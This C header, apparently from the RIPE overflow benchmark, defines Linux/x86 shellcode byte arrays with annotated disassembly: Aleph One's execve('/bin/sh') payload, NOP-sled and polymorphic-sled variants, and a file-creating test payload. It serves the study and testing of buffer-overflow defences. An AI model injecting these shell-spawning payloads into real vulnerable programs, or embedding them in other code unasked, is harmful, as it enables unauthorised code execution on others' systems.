/*
 shellcodes.h contains the definition of shellcodes for the given architecture. 
 A shellcode is a small piece of code used as the payload in the exploitation 
 of a software vulnerability and typically starts a command shell.

 When creating shellcode, it is generally desirable to make it both small and
 executable. When exploiting stack vulnerabilities it is also necessary to avoid
 placing zeros as they are string terminators.
*/

/*
 The following shellcodes were obtained modifying the Shellcode written by Aleph
 one and published on Insecure.org:
 - https://insecure.org/stf/smashstack.html

    Linux/x86 - execve(/bin/sh, [/bin/sh], NULL) - 45 bytes 

 It allows to call the `execve` syscall and later the `exit` syscall.
 The execve is called
 
    int execve(const char *pathname, char *const argv[], char *const envp[]);
 
 with `/bin/sh` as path, the current sp as argv and NULL as envp.

 In x86, the interrupt 0x80 is used as syscall mechanism. The syscall number is
 left in %eax, while arguments in registers, specifically:
  - %eax : syscall number
  - %ebx : 1st argument: pathname
  - %ecx : 2nd argument: argv pointer
  - %edx : 3rd argument: envp pointer

 The Shellcode contains the following instructions:
 
        eb 1f                   jmp    end
    begin:
        5e                      pop    %esi                 // put in esi pointer to '/bin/sh'
        89 76 08                mov    %esi, 0x8(%esi)      // move pointer to '/bin/sh' in stack (will be used as argv)
        31 c0                   xor    %eax, %eax           // clears %eax
        88 46 07                mov    %al, 0x7(%esi)       // put '0' as /bin/sh string terminator 
        89 46 0c                mov    %eax, 0xc(%esi)      // put 0x0 in stack (will be used as envp)
        b0 0b                   mov    $0xb, %al            // move 11 in %eax (syscall number)
        89 f3                   mov    %esi, %ebx           // move pointer to `/bin/sh` in %ebx
        8d 4e 08                lea    0x8(%esi), %ecx      // move pointer to argv in %ecx
        8d 56 0c                lea    0xc(%esi), %edx      // move null in %edx
        cd 80                   int    $0x80                // call sw interrupt 0x80:0xb (syscall execve(..))
        31 db                   xor    %ebx, %ebx           // clears %ebx
        89 d8                   mov    %ebx, %eax           // put 0 in %eax
        40                      inc    %eax                 // put 1 in %eax
        cd 80                   int    $0x80                // call sw interrupt 0x80:0x1 (syscall exit(0))
    end:
        e8 dc ff ff ff          call   begin                // pushes pointer to '/bin/sh'
        2f 62 69 6e 2f 73 68    '/bin/sh'

 The other two shellcodes are modification of the previous one. The 'simple-nop'
 is padded at the begin with a number of NOP instructions (0x90).
 In the 'polimorphic' the NOP sled is not the standard set of 0x90 bytes but a 
 set of instructions that can be executed without affecting the correctness of 
 the actual attack code (i.e. push %eax, pop %eax are functionally equivalent
 to a NOP instruction).
*/

/**
 * Shell code without NOP sled.
 * @author Aleph One
 */
static char shellcode_nonop[] =
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    "\x80\xe8\xdc\xff\xff\xff/bin/sh";

static size_t size_shellcode_nonop = sizeof(shellcode_nonop) / sizeof(shellcode_nonop[0]) - 1; // Do not count for the null terminator since a null in the shellcode will terminate any string function in the standard library

/**
 * Shell code with simple NOP sled
 * @author Pontus Viking
 * @author Aleph One
 */
static char shellcode_simplenop[] =
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    "\x80\xe8\xdc\xff\xff\xff/bin/sh";

static size_t size_shellcode_simplenop = sizeof(shellcode_simplenop) / sizeof(shellcode_simplenop[0]) - 1; // Do not count for the null terminator since a null in the shellcode will terminate any string function in the standard library

/**
 * Shell code with polymorphic NOP sled
 * @author Pontus Viking
 * @author Aleph One
 */
static char shellcode_polynop[] =
    "\x99\x96\x97\x93\x91\x4d\x48\x47\x4f\x40\x41\x37\x3f\x97\x46\x4e\xf8"
    "\x92\xfc\x98\x27\x2f\x9f\xf9\x4a\x44\x42\x43\x49\x4b\xf5\x45\x4c"
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    "\x80\xe8\xdc\xff\xff\xff/bin/sh";

static size_t size_shellcode_polynop =
    sizeof(shellcode_polynop) / sizeof(shellcode_polynop[0]) - 1;
/* Do not count for the null terminator since a null in the */
/* shellcode will terminate any lib string function */

/*
 The following shellcodes was written by Nick Nikiforakis for the RIPE 
 benchmark.

    Linux/x86 - creat(/tmp/rip-eval/f_xxxx, NULL) - 45 bytes 

 It allows to call the `creat` syscall and later the `exit` syscall.
 The creat is called

    int creat(const char *pathname, mode_t mode);

 with `/tmp/rip-eval/f_xxxx` as path, and ... as mode.

 In x86, the interrupt 0x80 is used as syscall mechanism. The syscall number is
 left in %eax, while arguments in registers, specifically:
  - %eax : syscall number
  - %ebx : 1st argument: pathname
  - %ecx : 2nd argument: read/write mode

 The Shellcode contains the following instructions:
 
        90 [...]                    nop
        eb 18                       jmp    call
    begin:        
        5b                          pop    %ebx                 // get pointer to file name
        31 c0                       xor    %eax, %eax           // clear %eax
        88 43 14                    mov    %al, 0x14(%ebx)      // move '0' to terminate file name
        b0 08                       mov    $0x8, %al            // move 0x8 in %eax (creat syscall is 0x8)
        31 c9                       xor    %ecx, %ecx           // clears %ecx
        66 b9 bc 02                 mov    $0x2bc, %cx          // use 0x2bc as mode
        cd 80                       int    $0x80                // calls creat
        31 c0                       xor    %eax,%eax            // clears eax
        b0 01                       mov    $0x1,%al             // move 1 in eax (exit syscall is 0x1)
        31 db                       xor    %ebx,%ebx            // clears ebx
        cd 80                       int    $0x80                // calls exit(0)
    call:
        e8 e3 ff ff ff              call   begin
        2f 74 6d 70                 /tmp
        2f 72 69 70 2d 65 76 61 6c  /rip-eval
        2f 66 5f 78 78 78 78        /f_xxxx

 The Shellcode is padded with a number of NOPs
*/

/**
 * Shellcode with NOP sled that touches a file in the /tmp/rip-eval/ directory
 * @author Nick Nikiforakis
 * @email: nick.nikiforakis[put @ here]cs.kuleuven.be
 *
 */

static char createfile_shellcode[] =
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\xEB\x18\x5B\x31\xC0\x88\x43\x14\xB0\x08\x31\xC9\x66\xB9\xBC\x02\xCD\x80\x31\xC0\xB0\x01\x31\xDB"
    "\xCD\x80\xE8\xE3\xFF\xFF\xFF/tmp/rip-eval/f_xxxx";